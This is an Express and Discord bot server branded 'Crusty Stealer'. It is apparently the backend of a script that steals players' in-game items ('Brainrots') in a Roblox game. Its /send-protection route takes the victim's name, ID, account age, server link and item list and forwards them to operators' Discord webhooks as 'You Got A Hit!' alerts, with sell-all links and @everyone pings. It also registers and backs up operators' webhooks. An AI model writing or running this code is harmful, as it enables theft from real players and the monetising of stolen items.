require("dotenv").config();
const express = require("express");
const axios = require("axios");
const { Client, GatewayIntentBits, AttachmentBuilder } = require("discord.js");
const fs = require("fs").promises;
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Configuration
const BOT_TOKEN = process.env.TKN;
const GUILD_ID = "1431770200382116014";
const CHANNEL_ID = "1431772644079833361";
const BACKUP_INTERVAL = 60000; // 60 seconds
const ENV_FILE = path.join(__dirname, ".env");

// RAM store
const webhooks = new Map();
let botReady = false;

// Discord Bot Setup - MİNİMAL CONFIG
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

// ----------------------
// File Operations
// ----------------------
async function saveToEnv() {
  try {
    let envContent = await fs.readFile(ENV_FILE, "utf-8").catch(() => "");
    envContent = envContent.split("\n").filter(line => !line.startsWith("WEBHOOK_")).join("\n");
    
    let index = 0;
    for (const [id, url] of webhooks.entries()) {
      envContent += `\nWEBHOOK_${index}_ID=${id}`;
      envContent += `\nWEBHOOK_${index}_URL=${url}`;
      index++;
    }
    
    await fs.writeFile(ENV_FILE, envContent.trim() + "\n");
    console.log("✅ Saved", webhooks.size, "webhooks");
  } catch (err) {
    console.error("❌ Save error:", err.message);
  }
}

async function loadFromEnv() {
  try {
    const envContent = await fs.readFile(ENV_FILE, "utf-8");
    const lines = envContent.split("\n");
    const tempWebhooks = new Map();
    
    for (const line of lines) {
      const idMatch = line.match(/^WEBHOOK_(\d+)_ID=(.+)$/);
      const urlMatch = line.match(/^WEBHOOK_(\d+)_URL=(.+)$/);
      
      if (idMatch) {
        const [, index, id] = idMatch;
        if (!tempWebhooks.has(index)) tempWebhooks.set(index, {});
        tempWebhooks.get(index).id = id;
      }
      if (urlMatch) {
        const [, index, url] = urlMatch;
        if (!tempWebhooks.has(index)) tempWebhooks.set(index, {});
        tempWebhooks.get(index).url = url;
      }
    }
    
    for (const [, { id, url }] of tempWebhooks) {
      if (id && url) webhooks.set(id, url);
    }
    
    console.log(`✅ Loaded ${webhooks.size} webhooks`);
  } catch (err) {
    console.log("ℹ️ No webhooks in .env");
  }
}

async function loadFromDiscordBackup() {
  try {
    const channel = await client.channels.fetch(CHANNEL_ID);
    if (!channel) return false;

    const messages = await channel.messages.fetch({ limit: 50 });
    const botMessages = messages.filter(m => m.author.id === client.user.id && m.attachments.size > 0);

    if (botMessages.size === 0) return false;

    const attachment = botMessages.first().attachments.first();
    if (!attachment || !attachment.name.endsWith(".json")) return false;

    const response = await axios.get(attachment.url);
    const data = response.data;

    if (Array.isArray(data)) {
      for (const { id, url } of data) {
        if (id && url) webhooks.set(id, url);
      }
      console.log(`✅ Loaded ${data.length} from Discord`);
      await saveToEnv();
      return true;
    }
    return false;
  } catch (err) {
    console.error("❌ Backup load failed:", err.message);
    return false;
  }
}

async function sendBackupToDiscord() {
  try {
    if (!botReady) return;
    
    const channel = await client.channels.fetch(CHANNEL_ID);
    if (!channel) return;

    const list = Array.from(webhooks.entries()).map(([id, url]) => ({ id, url }));
    const buffer = Buffer.from(JSON.stringify(list, null, 2), "utf-8");
    const attachment = new AttachmentBuilder(buffer, { name: "webhooks_backup.json" });

    await channel.send({
      content: `📦 Backup - ${new Date().toLocaleString()} | Total: ${list.length}`,
      files: [attachment],
    });

    console.log(`✅ Backup sent (${list.length} webhooks)`);
  } catch (err) {
    console.error("❌ Backup failed:", err.message);
  }
}

// ----------------------
// Discord Events - SADECE GEREKLI OLANLAR
// ----------------------
client.once("ready", async () => {
  botReady = true;
  console.log(`✅ BOT READY: ${client.user.tag}`);
  console.log(`🏠 Guilds: ${client.guilds.cache.size}`);
  
  if (webhooks.size === 0) {
    await loadFromDiscordBackup();
  }
  
  setInterval(sendBackupToDiscord, BACKUP_INTERVAL);
  console.log("✅ SYSTEM ONLINE!");
});

client.on("messageCreate", async (message) => {
  if (message.author.bot || message.guildId !== GUILD_ID) return;

  if (message.content.startsWith("!add")) {
    if (message.attachments.size === 0) {
      return message.reply("❌ Attach JSON file!");
    }

    const attachment = message.attachments.first();
    if (!attachment.name.endsWith(".json")) {
      return message.reply("❌ JSON only!");
    }

    try {
      const response = await axios.get(attachment.url);
      const data = response.data;

      if (!Array.isArray(data)) {
        return message.reply("❌ Invalid format!");
      }

      let added = 0;
      for (const item of data) {
        if (item.id && item.url) {
          webhooks.set(item.id, item.url);
          added++;
        }
      }

      await saveToEnv();
      await message.reply(`✅ Added ${added} webhooks!`);
    } catch (err) {
      await message.reply("❌ Failed to process!");
    }
  }
});

// ----------------------
// Express Routes
// ----------------------
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Crusty System</title>
      <style>
        body{margin:0;font-family:Arial;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}
        .container{text-align:center;background:rgba(255,255,255,0.1);padding:40px 60px;border-radius:20px;backdrop-filter:blur(10px)}
        h1{font-size:3em;margin-bottom:20px}
        .status{display:flex;justify-content:center;gap:30px;margin-top:30px}
        .status-item{display:flex;align-items:center;gap:10px;font-size:1.2em}
        .dot{width:12px;height:12px;border-radius:50%;background:${botReady ? '#0f0' : '#f00'};animation:pulse 2s infinite}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🛡️ Crusty System</h1>
        <div class="status">
          <div class="status-item"><span class="dot"></span><span>Bot ${botReady ? 'Aktif' : 'Starting'}</span></div>
          <div class="status-item"><span class="dot"></span><span>Site Aktif</span></div>
        </div>
      </div>
    </body>
    </html>
  `);
});

app.get("/status", (req, res) => {
  res.json({
    bot: botReady ? "online" : "starting",
    tag: client.user ? client.user.tag : "N/A",
    webhooks: webhooks.size,
    uptime: process.uptime()
  });
});

app.get("/create-protection/webhook", async (req, res) => {
  const { webhook } = req.query;
  if (!webhook) return res.status(400).json({ error: "Missing webhook" });

  const id = Date.now().toString(36) + Math.random().toString(36).slice(2);
  webhooks.set(id, webhook);
  await saveToEnv();

  res.json({ id });
});

app.get("/send-protection", async (req, res) => {
  const {
    id: webhookId,
    status,
    name,
    userid,
    displayname,
    accountage,
    playercount,
    gamename,
    privateserver,
    serverlink,
    mentioneveryone,
  } = req.query;

  const webhookURL = webhooks.get(webhookId);
  if (!webhookURL) return res.status(404).json({ error: "Webhook ID not found" });

  const items = [];
  for (let i = 1; i <= 50; i++) {
    const item = req.query[`item${i}`];
    if (item) items.push(item);
  }
  
  const itemsList = items.length ? items.join("\n") : "No Brainrots detected";
  const avatarUrl = "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png";

  let embed = {};

  if (status === "hit") {
    embed = {
      title: "Crusty Stealer",
      description: "**You Got A Hit!**",
      color: 0x8a2be2,
      thumbnail: { url: avatarUrl },
      fields: [
        {
          name: "Player Information",
          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${accountage || "-"} days\nDisplay: ${displayname || "-"}\`\`\``,
          inline: false,
        },
        {
          name: "Server Information",
          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${privateserver === "true" ? "Private Server" : "Public Server"}\`\`\``,
          inline: false,
        },
        {
          name: `Brainrots Detected (${items.length} total)`,
          value: `\`\`\`${itemsList}\`\`\``,
          inline: false,
        },
        {
          name: "Target Server",
          value: serverlink || "-",
          inline: false,
        },
        {
          name: "Sell All Brainrots",
          value: `[Click Here to Sell All Items](https://crusty.dev.tc/sell-all/${encodeURIComponent(name || "")})`,
          inline: false,
        },
        {
          name: "Check Activity Status",
          value: `[Click Here to Check if User is Active](https://crusty.dev.tc/status-info/${encodeURIComponent(name || "")})`,
          inline: false,
        },
      ],
      footer: { text: "Crusty Stealing System - Active", icon_url: avatarUrl },
      timestamp: new Date().toISOString(),
    };
  } else if (status === "altaccount") {
    embed = {
      title: "⚠️ Alt Account Detected",
      description: "**No Valid Brainrots Found!**",
      color: 0xff0000,
      thumbnail: { url: avatarUrl },
      fields: [
        {
          name: "Player Information",
          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${accountage || "-"} days\nDisplay: ${displayname || "-"}\`\`\``,
          inline: false,
        },
        {
          name: "Detection Result",
          value: "```No OG/Secret/Brainrot God animals found\nAccount flagged as alt```",
          inline: false,
        },
      ],
      footer: { text: "Crusty Anti-Alt System", icon_url: avatarUrl },
      timestamp: new Date().toISOString(),
    };
  } else if (status === "initializing") {
    embed = {
      title: "Crusty Stealer",
      description: "**Someone is using Crusty Your Stealer Script!**",
      color: 0x8a2be2,
      thumbnail: { url: avatarUrl },
      fields: [
        {
          name: "Player Information",
          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${accountage || "-"} days\nDisplay: ${displayname || "-"}\`\`\``,
          inline: false,
        },
        {
          name: "Server Information",
          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${privateserver === "true" ? "Private Server" : "Public Server"}\`\`\``,
          inline: false,
        },
      ],
      footer: { text: "Crusty Hit Steal - Initializing", icon_url: avatarUrl },
      timestamp: new Date().toISOString(),
    };
  } else {
    return res.status(400).json({ error: "Invalid status" });
  }

  const payload = {
    username: "Notifier | C̸͕͔͒͒r̸̟͓͒̓ụ̸̻̊̔s̴̻̖̀t̵̥͍͒͝y̶̥͊",
    avatar_url: avatarUrl,
    embeds: [embed],
  };

  if (status === "hit" && mentioneveryone === "true") {
    payload.content = "@everyone";
  }

  try {
    await axios.post(webhookURL, payload);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: "Failed to send webhook" });
  }
});

// ----------------------
// START
// ----------------------
console.log("🚀 Starting...");

app.listen(PORT, () => console.log(`✅ Server: ${PORT}`));

loadFromEnv().then(() => {
  console.log("🔐 Logging in...");
  client.login(BOT_TOKEN).catch(err => {
    console.error("❌ LOGIN FAILED:", err.message);
    console.error("❌ Check your TKN in .env!");
  });
});
